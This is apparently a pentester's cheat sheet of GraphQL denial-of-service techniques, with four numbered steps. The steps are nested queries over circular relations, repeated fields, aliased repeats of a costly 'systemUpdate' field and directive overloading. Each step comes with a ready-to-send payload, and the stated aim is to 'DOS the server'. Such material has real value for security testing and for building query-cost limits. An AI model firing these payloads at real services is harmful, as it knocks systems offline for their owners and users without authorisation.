1- look for circular relations in order to DOS the server 
```
query{post{owner{post{owner{post{owner{post{owe}}}}}}}}
```


2- look for repeatable fields 
```
    pastes {
        content
        content
        content
        content
        content
        content
        content
        content
        content
        content
    }
}
```

3- look for heavy query and try to repeat it with aliases
```
query {
    one:systemUpdate
    two:systemUpdate
    three:systemUpdate
    four:systemUpdate
}
```
4- test for directive overloading ( supply any non-existant directive and repeat it)
```
query {
    pastes{title @aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@}}
```

